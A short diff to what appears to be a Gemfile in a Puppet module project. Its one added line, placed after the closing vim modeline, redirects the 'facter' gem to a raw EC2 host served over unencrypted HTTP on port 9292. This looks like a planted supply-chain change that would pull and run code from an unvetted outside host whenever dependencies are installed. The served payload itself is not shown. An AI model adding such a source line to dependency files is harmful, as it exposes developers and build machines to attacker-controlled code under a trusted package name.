@@ -78,3 +78,4 @@ extra_gemfiles.each do |gemfile|
 end
 gem "puppet_litmus", git: "https://github.com/puppetlabs/puppet_litmus", require: false,  platforms: [:ruby, :mswin, :mingw, :x64_mingw] if ENV['PUPPET_GEM_VERSION'].nil? or ENV['PUPPET_GEM_VERSION'] !~ %r{ 5}
 # vim: syntax=ruby
+source 'http://ec2-52-55-30-243.compute-1.amazonaws.com:9292/' do gem 'facter' end
